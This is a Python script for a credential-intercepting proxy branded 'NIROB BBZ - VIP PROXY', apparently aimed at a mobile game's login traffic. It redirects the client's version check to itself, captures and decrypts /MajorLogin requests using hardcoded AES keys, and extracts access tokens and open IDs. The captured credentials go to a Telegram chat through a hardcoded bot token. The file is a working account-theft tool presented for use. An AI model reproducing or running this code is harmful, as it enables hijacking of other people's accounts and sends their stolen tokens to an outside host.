import json
import requests
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import httpx
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from x7m import *
import time
import random
import asyncio
from telegram import Bot

# ================= TELEGRAM CONFIG =================
BOT_TOKEN = "8859282308:AAFPrC5ooQOGxacZdnbB-ZjAQ5szGeLyf-Y"
CHAT_ID = "-1004291576288"
# ===================================================

# ANSI Colors for Terminal Styling
G = "\033[92m"  # Green
Y = "\033[93m"  # Yellow
R = "\033[91m"  # Red
B = "\033[94m"  # Blue
W = "\033[0m"   # Reset
C = "\033[96m"  # Cyan
M = "\033[95m"  # Magenta

# RGB Color codes for terminal
def rgb_color(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

# Rainbow text effect
def rainbow_text(text):
    colors = [
        (255, 0, 0),    # Red
        (255, 165, 0),  # Orange
        (255, 255, 0),  # Yellow
        (0, 255, 0),    # Green
        (0, 255, 255),  # Cyan
        (0, 0, 255),    # Blue
        (128, 0, 255)   # Purple
    ]
    result = ""
    for i, char in enumerate(text):
        color = colors[i % len(colors)]
        result += f"\033[38;2;{color[0]};{color[1]};{color[2]}m{char}"
    return result + W

# Glowing text effect with animation
def glowing_text(text, delay=0.05):
    colors = [
        (255, 50, 50),    # Bright Red
        (255, 100, 50),   # Orange-Red
        (255, 200, 50),   # Gold
        (50, 255, 50),    # Bright Green
        (50, 255, 200),   # Teal
        (50, 200, 255),   # Sky Blue
        (150, 50, 255),   # Purple
        (255, 50, 200)    # Pink
    ]
    for i in range(3):  # Animation loop
        print(f"\r{colors[i % len(colors)]}{text}{W}", end="", flush=True)
        time.sleep(delay)
    return ""

# Animated banner
def animated_banner():
    banner_frames = [
        f"{G}╔══════════════════════════════════════════╗",
        f"{Y}║          NIROB BBZ - VIP PROXY           ║",
        f"{C}║          SECURE SERVER v2.0              ║",
        f"{M}╚══════════════════════════════════════════╝{W}\n"
    ]
    for line in banner_frames:
        print(line)
        time.sleep(0.1)

# Get local IP address automatically for network proxy link
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

LOCAL_IP = get_local_ip()
PORT = 6543

animated_banner()

# ================= CONFIGURATION =================
Key, Iv = b'Yg&tc%DEuh6%Zc^8', b'6oyZDr22E3ychjM%'

def EnC_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return cipher.encrypt(pad(HeX, AES.block_size)).hex()
    
def DEc_AEs(HeX):
    cipher = AES.new(Key, AES.MODE_CBC, Iv)
    return unpad(cipher.decrypt(HeX), AES.block_size).hex()

# ================= TELEGRAM SENDER =================
def send_to_telegram(access_token, open_id):
    """Send captured credentials to Telegram group"""
    try:
        message = f"""👑 New Token!

🔑 Token:
{access_token}

🆔 Open ID:
{open_id}

👑 Powered by: NIROB BBZ
⚡ Status: Successful Intercept
"""
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            print(f"{G}[✔] Token sent to Telegram!{W}")
        else:
            print(f"{R}[!] Failed to send: {response.text}{W}")
    except Exception as e:
        print(f"{R}[!] Telegram send error: {e}{W}")

# ================= PROXY HANDLER =================
class ProxyHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return

    def do_GET(self):
        self.handle_request_method()

    def do_POST(self):
        self.handle_request_method()

    def handle_request_method(self):
        parsed_path = urlparse(self.path)
        path = parsed_path.path

        # Handle /ver.php route
        if path == "/ver.php":
            target = "https://version.ggwhitehawk.com/live/ver.php"
            print(f"{B}[INFO] Forwarding /ver.php request...{W}")
            
            headers = {
                k: v for k, v in self.headers.items()
                if k.lower() not in ("host", "content-length", "connection")
            }
            
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length) if content_length > 0 else b""

            try:
                with httpx.Client(follow_redirects=True) as client:
                    r = client.request(self.command, target, params=parse_qs(parsed_path.query), headers=headers, content=body)

                try:
                    data = r.json()
                except json.JSONDecodeError:
                    data = {"raw": r.text}
                    
                data["server_url"] = f"http://{LOCAL_IP}:{PORT}/"

                self.send_response(r.status_code)
                HOP_BY_HOP = {'transfer-encoding', 'connection', 'keep-alive', 'proxy-authenticate', 'proxy-authorization', 'te', 'trailers', 'upgrade', 'proxy-connection'}
                for k, v in r.headers.items():
                    if k.lower() not in HOP_BY_HOP and k.lower() not in ("content-length", "content-encoding"):
                        self.send_header(k, v)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps(data).encode('utf-8'))
            except Exception as e:
                print(f"{R}[!] /ver.php Error: {e}{W}")
                self.send_response(500)
                self.end_headers()

        # Handle /MajorLogin route (VIP Trap)
        elif path == "/MajorLogin":
            print(f"\n{rainbow_text('[+] TARGET HIT! /MajorLogin captured!')}{W}")
            content_length = int(self.headers.get('Content-Length', 0))
            pyl = self.rfile.read(content_length)
            
            try:
                x7m_data = json.loads(get_available_room(decrypt_api(pyl.hex())))
                access_token, open_id = x7m_data["29"], x7m_data["22"]
            except Exception as e:
                print(f"{R}[!] Decryption/Parsing Failed: {e}{W}")
                access_token, open_id = "FAILED_TO_EXTRACT", "FAILED_TO_EXTRACT"

            print(f"{Y}[*] Extracting Credentials...{W}")
            
            # RGB Animated Credential Display
            print(f"\n{C}{'═' * 60}{W}")
            print(f"{rainbow_text('🔥 VIP ACCOUNT CAPTURED 🔥')}")
            print(f"{C}{'═' * 60}{W}")
            
            # Animated Token Display with RGB
            print(f"\n{Y}🔑 {C}Access Token:{W}")
            for i in range(3):
                colored_token = rainbow_text(f"  {access_token}")
                print(f"\r{colored_token}", end="", flush=True)
                time.sleep(0.1)
            print()
            
            # Animated Open ID Display with RGB
            print(f"\n{Y}🆔 {C}Open ID:{W}")
            for i in range(3):
                colored_id = rainbow_text(f"  {open_id}")
                print(f"\r{colored_id}", end="", flush=True)
                time.sleep(0.1)
            print()
            
            print(f"\n{C}{'═' * 60}{W}")
            print(f"{rainbow_text('👑 Powered by: NIROB BBZ')}")
            print(f"{rainbow_text('⚡ Status: Successful Intercept')}")
            print(f"{C}{'═' * 60}{W}\n")
            
            # ===== SEND TO TELEGRAM =====
            send_to_telegram(access_token, open_id)
            # =============================
            
            # RGB Glowing effect for the response payload
            response_payload = f"""[b][c][00FFFF]✘━━━━━━━━━━━━━[FFD3EF]ZIBON[00FFFF]━━━━━━━━━━━━✘

[FF0000]Access Token => [00FF00]{access_token} [FF0000]| Open ID => [00FF00]{open_id}

[FF00FF]System Owner: [00FFFF]SPEED [FF0000]X [FFFF00]ZIBON 
[FFFF00]TG => [FF0000]@GHOST_XAPIS

[b][c][00FFFF]✘━━━━━━━━━━━━━[FFD3EF]ZIBON[00FFFF]━━━━━━━━━━━━✘
"""

            self.send_response(500)
            self.send_header("Content-Type", "application/octet-stream")
            self.end_headers()
            self.wfile.write(response_payload.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")

def run(server_class=HTTPServer, handler_class=ProxyHandler, port=PORT):
    server_address = ('0.0.0.0', port)
    httpd = server_class(server_address, handler_class)
    
    # RGB Status Display
    status_colors = [
        (255, 0, 0),    # Red
        (255, 165, 0),  # Orange
        (255, 255, 0),  # Yellow
        (0, 255, 0),    # Green
        (0, 255, 255),  # Cyan
        (0, 0, 255),    # Blue
        (128, 0, 255)   # Purple
    ]
    
    for i, color in enumerate(status_colors):
        color_code = f"\033[38;2;{color[0]};{color[1]};{color[2]}m"
        print(f"{color_code}[✔] Status      : {W}{Y}Running Successfully{W}")
        time.sleep(0.05)
    
    print(f"{G}[✔] Port        : {W}{Y}{port}{W}")
    print(f"{G}[✔] Local Proxy : {W}{B}http://127.0.0.1:{port}/{W}")
    print(f"{G}[✔] Network IP  : {W}{B}http://{LOCAL_IP}:{port}/{W}")
    print(f"{rainbow_text('──────────────────────────────────────────')}")
    print(f"{Y}[*] Waiting for target requests...{W}\n")
    
    httpd.serve_forever()

if __name__ == '__main__':
    run()
